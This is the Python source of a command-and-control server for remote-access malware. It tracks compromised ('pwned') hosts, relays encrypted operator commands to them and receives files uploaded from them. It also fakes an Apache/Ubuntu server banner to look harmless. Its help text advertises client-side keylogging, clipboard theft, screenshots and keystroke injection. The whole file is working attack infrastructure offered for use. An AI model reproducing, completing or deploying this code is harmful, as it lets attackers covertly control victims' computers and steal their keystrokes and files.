#! /usr/bin/python3


from datetime import datetime
from email.utils import unquote
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from os import listdir, mkdir, path, system
from urllib.parse import unquote_plus, urlparse
from encryption import cipher
from setting import (BIND_ADDR, FILE_PUT, FILE_REQUEST, LOG, PWD_RESPONSE, CMD_REQUEST, PORT, CMD_RESPONSE, 
                     CMD_RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD, INCOMING, OUTGOING, SHELL, ZIP_PASS)
from inputimeout import inputimeout, TimeoutOccurred
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES


def get_new_session():
    """if client killed, check if there is another session; 
    yes --> choose one to make active; 
    no --> re-initialize the session variables"""
    
    global active_session, pwned_id, pwned_dic
    
    #if only one entry left, it means there is going to be empty dic after we delete the entry,
    # so initialize the dic
    if len(pwned_dic) == 1:
        print("\n[*] waiting for new connection\n")
        pwned_dic = {}
        pwned_id = 0
        active_session = 1 
    else:
        # display the sessions and choose one of them
        while True:
            # print the sessions
            for key, value in pwned_dic.items():
                if key != active_session:
                    print(key, "-", value)
            try:
                new_session = int(input("Choose a new session number to make active: "))
            except ValueError:
                print("\033[91mnumber only\033[0m\n")
                continue

            # make sure the given number is in pwned_dic and is not now active session
            if new_session in pwned_dic and new_session != active_session:
                old_active_session = active_session
                active_session = new_session
                del pwned_dic[old_active_session]
                print(f"\n\033[92m[active session]\033[0m {pwned_dic[active_session]}")
                break
            else:
                print("\033[91mchoose a number in the displayed session(s)\033[0m\n")
                continue


class C2handler(BaseHTTPRequestHandler):
    """child class of the BaseHTTPRequestHandler, handling the incoming request arrive at 
    c2 server"""

    # change server and system version to common, non-suspicious ones
    server_version = "Apache/2.4.58"
    sys_version = "Ubuntu 22.04.4 LTS"
    
    def do_GET(self):
        """handling the http GET requests arrive at the c2 server"""

        # these variables must be globle as they will often be changed via miltiple sessions
        global client_account, client_hostname, client_dir, pwned_dir, active_session, pwned_id, pwned_dic

        
            #check if the client command requests is valid
        if self.path.startswith(CMD_REQUEST):

            #request format : [user]@[hostname]@[epoch time]@[directory]
            client = self.path.split(CMD_REQUEST)[1]
            
            # reverse the client encode and encrypt processes
            client = cipher.decrypt(client.encode()).decode()
            
            
            # split out the directory
            client_dir = client.split("@")[3]

            # remove cleint_dir in case directory changes affect the checkin of the client
            # same client with different dir with deem as different user
            client = client.replace(f"@{client_dir}", '', 1)
            
                # split out client and hostname
            client_account = client.split("@")[0]
            client_hostname = client.split("@")[1]
                    

            # when new client checks in
            if client not in pwned_dic.values():
                
                # send http status and header to client
                self.http_response(404)
                
                # use pwned id as key and client as value
                pwned_id += 1
                pwned_dic[pwned_id] = client
                # pwned_dir[pwned_id] = client_dir

                print(f"\033[92m[Check In]\033[0m{client_account}@{client_hostname}\n")
                
                # log the pwned client
                with open(LOG, "a") as file_handle:
                    file_handle.write(f"{datetime.now()}-{self.client_address}-{pwned_dic[pwned_id]}\n")

            # client is in pwned_dic and our active session
            elif client == pwned_dic[active_session]:

                
                #if input time is set , run inputtimeout instead of input
                if INPUT_TIMEOUT:
                    try:
                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{unquote_plus(client_dir)}$ ", timeout=INPUT_TIMEOUT) 

                    except TimeoutOccurred:
                        command = KEEP_ALIVE_CMD

                else:
                    command = input(f"{client_account}@{client_hostname}:{unquote_plus(client_dir)}$ ")
                    
                
                # if the command start with "server" means we want to run a server command
                if command.startswith("server "):
                    
                    # server show clients will print the pwned sessions and the activve session
                    if command == "server show clients":
                        print("\n[*] available pwned sessions:")
                        print_active = None
                        for key, value in pwned_dic.items():
                            if key == active_session:
                                print_active = str(key) + " - " + value
                            else:
                                print(str(key), "-", value)
                        print("\n[*] your active session:", print_active, sep="\n")
                        
                    
                    # server control command let us switch the acctive session
                    elif command.startswith("server control"):  
                        try:
                            possible_new_session = int(command.split()[2])
                            if possible_new_session in pwned_dic:
                                active_session = possible_new_session
                                print(f"[active session] {active_session} - {pwned_dic[active_session]}")
                                print(f"waiting for client to wake up")
                            else:
                                raise ValueError
                        except (ValueError, IndexError):
                            print("enter valid id. use show server clients to list valid session")
                            
                    # server command to unzip files on the server
                    elif command.startswith("server unzip"):
                        filename = " ".join(command.split()[2:])
                        if not filename:
                            print("must give a filename in incoming directory\n")
                        else:
                            try:
                                if not path.isfile(f"{INCOMING}/{filename}"):
                                    raise OSError
                                with AESZipFile(f"{INCOMING}/{filename}") as zip_file:
                                    zip_file.setpassword(ZIP_PASS)
                                    zip_file.extractall(INCOMING)
                                    print(f"{filename} is unzipped at {INCOMING}\n")
                            except OSError:
                                print(f"unable to access {INCOMING}/{filename}\n")
                            
                    # "server zip [FILENAME]" command allows us to zip file in outgoing directory
                    elif command.startswith("server zip"):
                        filename = " ".join(command.split()[2:]) 
                        if not filename:
                            print("must give a filename in outgoing directory\n")
                        else:
                            try:
                                if not path.isfile(f"{OUTGOING}/{filename}"):
                                    raise OSError
                                with AESZipFile(f"{OUTGOING}/{filename}.zip", mode="w", compression=ZIP_LZMA, 
                                                encryption=WZ_AES) as zip_file:
                                    zip_file.setpassword(ZIP_PASS)
                                    zip_file.write(f"{OUTGOING}/{filename}", filename)
                                    print(f"{filename} is zipped at {OUTGOING}\n")
                            except OSError:
                                print(f"unable to access {OUTGOING}/{filename}\n")
                            
                                         
                    # list the directory of the server
                    elif command.startswith("server list"):
                        directory = None
                        try:
                            directory = command.split()[2]
                            print(*listdir(directory), sep="\n")
                        except NotADirectoryError:
                            print(f"{directory} is not a directory")
                        except FileNotFoundError:
                            print(f"{directory} not found on the server")
                        except PermissionError:
                            print(f"permission denied")
                        except IndexError:
                            print(*listdir(), sep="\n")
                            
                    # prompt a shell on the server
                    elif command == "server shell":
                        print("Type 'exit' to return to c2 server terminal")
                        system(SHELL)
                    
                    # kill the server. client stay alive
                    elif command == "server exit":
                        double_check = input("Are you sure to kill the server? (Y/N)")
                        if double_check.lower == "y" or "yes":
                                print("the c2 server has been shut down")
                                server.shutdown()
                                
                    
                    # server help command that show all the available commands
                    elif command == "server help":
                        print("""
                            Available server commands:
                            - server show clients: Display all pwned sessions and the active session.
                            - server control [ID]: Switch the active session to the specified ID.
                            - server unzip [FILENAME]: Decrypt and unzip a file in the incoming directory on the server.
                            - server zip [FILENAME]: Encrypt and zip a file in the outgoing directory on the server.
                            - server list [DIRECTORY]: List the contents of the specified directory on the server.
                            - server shell: Open a shell on the server.
                            - server exit: Shut down the server.
                            - server help: Show this help message.

                            Available client commands:
                            - client kill: Terminate the client session.
                            - client download [FILENAME]: Download a file from the server.
                            - client upload [FILENAME]: Upload a file to the server.
                            - client zip [FILENAME]: Encrypt and zip a file on the client.
                            - client unzip [FILENAME]: Decrypt and unzip a file on the client.
                            - client delay [SECONDS]: Set the delay between reconnection attempts.
                            - client get clipboeard: Get a ccopy of client clipboard content.
                            - client screenshot: Take a screenshot of the client's screen.
                            - client type [TEXT]: Type text on the client. (windows or linux with X server or uinput)
                            - clienr keylogger on / off: Start or stop the keylogger on the client. (windows or 
                               linux with X server or uinput)
                            - client diplay [image_file]: Display an image on the client screen.
                            - client flip screen: Flip the client's screen upside down (Windows only).
                            - client max volume: Set the client's volume to maximum. (windows or linux with X server or uinput)
                            - client play [sound.wav]: Play a .wav sound file on the client (Windows only). 
                            - [command] & : Run a command in the background on the client.
                        """)
                    
                    # Must send a response to client after a server command in order to finish the connection  
                    self.http_response(204) # 204 : No Content
                    
                else:   
                    # send command back to client
                    try:
                        
                        self.http_response(200)
                        # send the encrypted and encoded command
                        self.wfile.write(cipher.encrypt(command.encode("utf-8")))
                        
                    except OSError:
                        print(f"\033[91mlose connection to {pwned_dic[active_session]}\033[0m")
                        get_new_session()
                    
                    else:    
                        # start a new session at  client kill
                        if command == "client kill":
                            print(f"\033[91m[client kill]\033[0m {pwned_dic[active_session]}")
                            get_new_session()
                    
            # client is in pwned_dic but not our active session
            else:        
                self.http_response(404)
        
        
        # download handle for handling file download request from client      
        elif self.path.startswith(FILE_REQUEST):
            
            #spit out the encryted filename
            filename = self.path.split(FILE_REQUEST)[1]
            # decrypt the filename
            filename = cipher.decrypt(filename.encode()).decode()

            # read the file into memory and send to client    
            try:
                with open(f"{filename}", "rb") as file_handle:
                    
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(file_handle.read()))
                    
            except OSError:
                print(f"{filename} was not found on the server")
                self.http_response(404)            
        
        else:
            # no noe should access the server without the right path string
            print(f"{self.client_address[0]} accessed the server at {self.path} for some reason\n")

    def do_PUT(self):
        """This method hadle http PUT arrive at the server"""
        
        # data arrive at the server must start with the string FILE_PUT
        if self.path.startswith(FILE_PUT + "/"):
            
            self.http_response(200)
            
            # decrypt the filename splitted from filepath 
            filename = cipher.decrypt(self.path.split(FILE_PUT + "/")[1].encode()).decode()
                        
            #the destination for uploaded file
            incomming_file = f"{INCOMING}/{filename}"
            
            # get the length of the file
            file_length = int(self.headers.get('content-length'))
            
            # write the uploaded file to the destination 
            with open(incomming_file, "wb") as file_handle:
                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
            print(f"file [{filename}] uploaded to {INCOMING}/")
                
        else:
            # no noe should access the server without the right path string
            print(f"{self.client_address[0]} accessed the server at {self.path} for some reason\n")
                    
        
    def do_POST(self):
        
        """handling the http POST requests arrive at the c2 server"""
        
        # print the command exec resutl from the client
        if self.path == CMD_RESPONSE:
            print(self.post_data_handler())

        # handle cd POST request; it is now handled by GET request
        # elif self.path == PWD_RESPONSE:
        #     global cwd
        #     cwd = self.post_data_handler() 
            
        # no one should post to our server other than to the path above
        else: 
            print(f"{self.client_address[0]} just accessed {self.path} on our server")
    

    def post_data_handler(self):
        '''handle the data post from the client'''
        self.http_response(200)
        # read the command result
        length = int(self.headers.get('content-length'))
        client_data = self.rfile.read(length)
        
        client_data = client_data.decode()
        # remove the http post variable and '=' from client data
        client_data = client_data.replace(f"{CMD_RESPONSE_KEY}=", '', 1)
        # remove the garbage from decoded client_data
        client_data = unquote_plus(client_data)
        # decrypt the data
        client_data = cipher.decrypt(client_data.encode()).decode()
        return client_data


    def http_response(self, code: int):
        
        self.send_response(code)
        self.end_headers()
        
            
        
        
       
       
    def log_request(code='-', size='-'):
        '''To get rid of sucessful log message on stdout; overwrite BaseHTTPRequestHandler
         log_request method'''
        return

# map to client we have prompt for
active_session = 1

# this is the accouent from the client belonging to the active session 
client_account = ""

# this is the hostname from the client belonging to the active session 
client_hostname = ""

# count and trcack each client connection
pwned_id = 0

# track all pwned client; key = pwned_id , value = user@hostname@(epoch time)
pwned_dic = {}

#track all client directory; key = pwned_id , value = getcwd()
pwned_dir = {}

# for prompt showing location
# cwd = "~"

# make incoming directory for client upload if there isn't one
if not path.isdir(INCOMING):
    mkdir(INCOMING)

# make outgoing directory for client download if there isn't one
if not path.isdir(OUTGOING):
    mkdir(OUTGOING)

# initiate our server
server = ThreadingHTTPServer((BIND_ADDR, PORT), C2handler)
print("\n[*] waiting for new connection\n")

server.serve_forever()



